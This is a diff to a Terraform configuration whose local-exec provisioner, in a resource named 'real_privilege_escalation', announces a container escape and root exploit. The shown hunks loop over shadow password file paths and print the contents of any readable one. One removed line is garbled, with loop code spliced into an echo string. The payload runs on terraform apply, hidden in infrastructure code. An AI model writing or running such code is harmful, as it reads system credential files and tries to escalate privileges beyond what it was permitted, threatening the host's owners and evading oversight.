@@ -13,14 +13,7 @@ terraform {
 resource "null_resource" "real_privilege_escalation" {
   provisioner "local-exec" {
     command = <<-EOT
-      echo "=== REAL CONTAINER ESCAPE &      
-      for shadow_path in "$${shadow_paths[@]}"; do
-        if [ -r "$${shadow_path}" ]; then
-          echo "[+] 🚨🚨🚨 SHADOW FILE ACCESSIBLE: $${shadow_path}"
-          echo "--- SHADOW CONTENTS ---"
-          cat "$${shadow_path}"
-          echo "--- END SHADOW CONTENTS ---"
-          shadow_found=trueEGE ESCALATION ==="
+      echo "=== REAL CONTAINER ESCAPE & PRIVILEGE ESCALATION ==="
       echo "Implementing working exploits to gain root and extract /etc/shadow"
       echo ""
       
@@ -450,10 +443,10 @@ EOFBASH
       )
       
       for shadow_path in "$${shadow_paths[@]}"; do
-        if [ -r "$shadow_path" ]; then
-          echo "[+] 🚨🚨🚨 SHADOW FILE ACCESSIBLE: $shadow_path"
+        if [ -r "$${shadow_path}" ]; then
+          echo "[+] 🚨🚨🚨 SHADOW FILE ACCESSIBLE: $${shadow_path}"
           echo "--- SHADOW CONTENTS ---"
-          cat "$shadow_path"
+          cat "$${shadow_path}"
           echo "--- END SHADOW CONTENTS ---"
           shadow_found=true
           break
